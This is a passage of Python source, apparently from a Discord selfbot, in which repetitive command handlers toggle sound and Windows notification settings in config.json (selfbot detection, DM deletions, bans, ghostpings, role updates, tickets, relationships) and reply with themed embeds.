            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Switch Mode', description='Switched to embed mode.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

                
        elif json.load(open('config.json', encoding='utf-8'))['embed_mode'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_mode'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Switch Mode', description='Switched to codeblock mode.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
                
        set_vars()
        
    @React.command(usage="ssbdetection", description="Toggles selfbot detection sound notifications")
    async def ssbdetection(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['selfbot_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['selfbot_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Selfbot Sound Notifications', description='Selfbot detection sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Selfbot sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['selfbot_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['selfbot_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Selfbot Sound Notifications', description='Selfbot detection sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Selfbot sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="sdmdels", description="Toggles DM deletions sound notifications")
    async def sdmdels(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['dm_delete_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['dm_delete_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'DM Deletion Sound Notifications', description='DM deletion sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'DM deletion sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['dm_delete_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['dm_delete_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'DM Deletion Sound Notifications', description='DM deletion sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'DM deletion sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="sban", description="Toggles server ban sound notifications")
    async def sban(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['ban_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ban_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Server Ban Sound Notifications', description='Server ban detection sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Server ban sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['ban_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ban_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Server Ban Sound Notifications', description='Server ban detection sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Server ban sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="sghostping", description="Toggles Ghostping sound notifications")
    async def sghostping(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['ghostping_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ghostping_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ghostping Sound Notifications', description='Ghostping detection sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Ghostping sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['ghostping_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ghostping_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ghostping Sound Notifications', description='Ghostping detection sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Ghostping sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="sroleupdates", description="Toggles Role updates detection sound notifications")
    async def sroleupdates(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['role_update_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['role_update_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Role Update Sound Notifications', description='Role update detection sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Role update sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['role_update_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['role_update_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Role Update Sound Notifications', description='Role update detection sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Role update sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="stickets", description="Toggles Tickets detection sound notifications")
    async def stickets(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['ticket_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ticket_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ticket Sound Notifications', description='Ticket detection sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Ticket sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['ticket_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ticket_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ticket Sound Notifications', description='Ticket detection sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Ticket sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="srelationships", description="Toggles Relationship updates sound notifications")
    async def srelationships(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['relationship_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['relationship_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Relationship Sound Notifications', description='Relationship updates sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Relationship updates sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['relationship_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['relationship_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Relationship Sound Notifications', description='Relationship updates sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Relationship updates sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="ndmdels", description="Toggles DM deletion Windows notifications")
    async def ndmdels(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['deleted_dm_notify'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['deleted_dm_notify'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'DM Notifications', description='DM deletion notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'DM deletion notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['deleted_dm_notify'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['deleted_dm_notify'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'DM Notifications', description='DM deletion notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
